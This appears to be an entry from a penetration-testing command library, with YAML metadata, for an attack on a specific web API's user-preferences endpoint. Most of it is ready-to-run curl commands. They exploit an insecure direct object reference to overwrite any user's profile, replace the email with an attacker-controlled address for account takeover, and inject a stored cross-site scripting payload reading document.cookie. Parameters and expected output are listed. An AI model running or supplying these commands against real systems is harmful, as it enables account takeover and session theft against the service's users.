---
data: >-
  PUT https://api.outpost.co/api/v1/user/preferences/{target-uuid} -H "Cookie:
  auth={auth-cookie}" -H "Content-Type: application/json" -d '{ "firstName":
  "modified", "email": "{attacker-email}", "signature": "<img src=x
  onerror=alert(document.cookie)>", ... }'
tags:
  - exploit
  - idor
  - xss
type: command
output: HTTP 200 with updated preferences confirmation
executor: http
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:29.237Z'
id: 26376ef0-c12c-4161-98c2-ea7c6ef4c1dc
verified: false
validated: true
submitted: true
---
# put-update-preferences

## Command

```bash
curl -X PUT "https://api.outpost.co/api/v1/user/preferences/{target-uuid}" \
  -H "Cookie: auth={auth-cookie}" \
  -H "Content-Type: application/json" \
  -d '{"firstName":"user1-changed-by-user2","lastName":"null","email":"{attacker-email}","role":"USER","defaultMailboxUuid":"","mailboxUuids":["e4a63ae3-bb10-46f8-be28-a2660a2344ec"],"signature":"<p style=\"margin:0;\">User Signature2<img src=x onerror=alert(document.cookie) ></p>","timezone":"Europe/Moscow","defaultSendAndResolve":false,"selectFirstConversation":true}'
```

## Description

Updates a user's preferences via the API, exploiting IDOR by using any UUID; injects XSS and changes email for takeover.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `{target-uuid}` | UUID of the user to modify | Yes |
| `{auth-cookie}` | Cookie of the authenticated low-priv user | Yes |
| `email` | New email (attacker controlled) | Yes |
| `signature` | XSS payload string | Yes |

## Examples

### Basic Usage

```bash
curl -X PUT "https://api.outpost.co/api/v1/user/preferences/da4f313f-e21e-4b5f-b2da-42d9864716f6" \
  -H "Cookie: auth=eyJ..." \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@evil.com","signature":"<img src=x onerror=alert(1)>"}'
```

### Advanced Usage

Full JSON body as in data for complete profile overwrite.

## Expected Output

{"success": true} or similar 200 response; changes applied silently.

## Related

- [[commands/get-conversation-assigned]]
- [[procedures/Exploit-IDOR-to-Update-Preferences-with-XSS]]
